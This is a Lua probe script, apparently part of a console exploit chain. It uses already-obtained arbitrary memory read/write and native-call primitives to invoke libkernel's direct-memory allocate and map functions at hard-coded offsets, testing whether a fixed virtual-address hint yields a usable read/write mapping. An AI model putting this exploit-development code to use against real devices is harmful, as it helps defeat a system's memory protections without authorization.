-- CRASH_CLASS: LOW
-- PROBE 544m: MapDirectMemory with pre-set virtual address hint
--
-- Hypothesis: MapDM rv=0 but maps at a virtual address that collides
-- with the native handler's chain memory. Crash on return to chain.
--
-- Test 1: Set *virt_out to a known safe high address (0x880000000)
--   If MapDM respects the hint → maps there, no collision.
-- Test 2: Set *virt_out to 0 but see if we can extract the mapped
--   address from the crash dump (it might be in the binary output).
--
-- The crash dump starts with 0x13371337 and contains a structure.
-- Let's also analyze the crash dump from previous runs to find the
-- virtual address that was mapped.

print("=== PROBE 544m: MapDM FIXEDADDR ===")
io.stdout:setvbuf("no")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end; return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end; return nil
end

if not libkernel_base then print("FATAL"); return end
local pid = to_num(syscall.getpid())
print("pid=" .. pid)
print("lk=" .. q(libkernel_base))

local map_fn = libkernel_base + uint64(0x15020)
local alloc_fn = libkernel_base + uint64(0x17EF0)

-- AllocDM
local phys_out = memory.alloc(8)
wq(phys_out, uint64(0))
local ok_a, arv = pcall(function()
    return native.fcall_with_rax(alloc_fn, 0,
        uint64(0), uint64("0x150000000"), uint64(0x4000),
        uint64(0x4000), uint64(0), uint64(phys_out))
end)
if not ok_a or to_num(arv) ~= 0 then print("ALLOC FAIL"); return end
local phys = memory.read_qword(phys_out)
print("phys=" .. q(phys))

-- Prepare virt_out with a FIXED target address
-- Use an address far from the heap (0x880000000 range)
-- This is above typical userland heap but below kernel space
local virt_out = memory.alloc(8)

-- Use flags=MAP_FIXED (0x10) to force the address?
-- No: MAP_FIXED in mmap uses flags, but MapDM's flags arg may be different.
-- Let's try: *virt_out = target_addr (Sony SDK semantics: if non-zero, use as hint)
local target = uint64("0x880000000")
wq(virt_out, target)
print("target=" .. q(target))
print("virt_out=" .. q(virt_out))

-- Verify target is written
local check = rq(virt_out)
print("check=" .. q(check))

-- MapDM with hint address
print("MAP...")
local ok_m, mrv = pcall(function()
    return native.fcall_with_rax(map_fn, 0,
        uint64(virt_out), uint64(0x4000), uint64(3),
        uint64(0), phys, uint64(0x4000))
end)

-- Check results
print("pcall=" .. tostring(ok_m))
if ok_m then
    local rv = to_num(mrv)
    print("rv=" .. rv)

    if rv == 0 then
        print("SUCCESS")
        -- Read virt_out
        local virt = rq(virt_out)
        print("virt=" .. q(virt))

        if virt and to_num(virt) ~= 0 then
            -- Test R/W
            wd(virt, 0xDEADBEEF)
            local rb = rd(to_num(virt))
            if rb then
                if rb < 0 then rb = rb + 0x100000000 end
                print(string.format("R=0x%08X", rb))
                if rb == 0xDEADBEEF then
                    print("*** R/W ***")
                end
            end
        end
    else
        if rv < 0 then rv = rv + 0x100000000 end
        print(string.format("err=0x%X", rv))

        -- Try without hint (virt_out=0)
        print("RETRY with hint=0")
        wq(virt_out, uint64(0))

        local ok2, rv2 = pcall(function()
            return native.fcall_with_rax(map_fn, 0,
                uint64(virt_out), uint64(0x4000), uint64(3),
                uint64(0), phys, uint64(0x4000))
        end)

        print("pcall2=" .. tostring(ok2))
        if ok2 then print("rv2=" .. to_num(rv2)) end
    end
end

print("C=" .. tostring(pcall(function() return syscall.getpid() end)))
print("=== DONE ===")
